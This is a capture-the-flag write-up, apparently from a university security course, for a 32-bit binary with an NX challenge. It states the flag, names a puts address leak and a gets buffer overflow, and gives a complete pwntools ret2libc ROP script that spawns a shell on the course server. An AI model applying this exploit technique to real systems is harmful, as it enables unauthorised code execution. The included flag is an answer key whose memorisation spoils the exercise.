nx-2 | roproprop
===========================

Flag: 6447{1403f546-2002-4f3a-8da7-13493dc643b7}

General overview of problems faced
-------------------------------------
- The function post-amble in this case was confusing as it was moving the stack around between multiple registers/addresses
- Had to use a libc database search to find the libc version used and calculate corresponding offset

List of vulnerabilities
--------------------
1. Infoleak: we are given the address to the `puts` function
2. Buffer overflow: The program uses `gets` to take input into a fixed length buffer

Steps to exploit
------------------
1. Record the `puts` address pointer
2. Use a libc database to find which libc library is being used and using the given offsets, calculate the system address and the "/bin/sh" string address
3. Send as a single payload: 
    - 1 byte to fix offset
    - the address 0x08048331 in little endian format 331 times
    - the calculated system address
    - 4 bytes to replace return address
    - the calcuated "/bin/sh" address
4. Congratulations you now have a shell

Script/Command used
------------------
```python
#!/usr/bin/env python
# -*- encoding: utf-8 -*-

from pwn import *

r = remote("wargames.6447.sec.edu.au", 8002)

r.recvuntil("number:")
resp = r.recvline().strip()
print resp

puts_address = int(resp, 16)
system_address = puts_address - 0x24f00
bin_sh_address = puts_address + 0xfbd6b

print hex(system_address)
print hex(bin_sh_address)

ret_rop_gadget = 0x08048331

r.sendline("A" + p32(ret_rop_gadget) * 331 + p32(system_address) + "BBBB" + p32(bin_sh_address))

r.interactive()
```
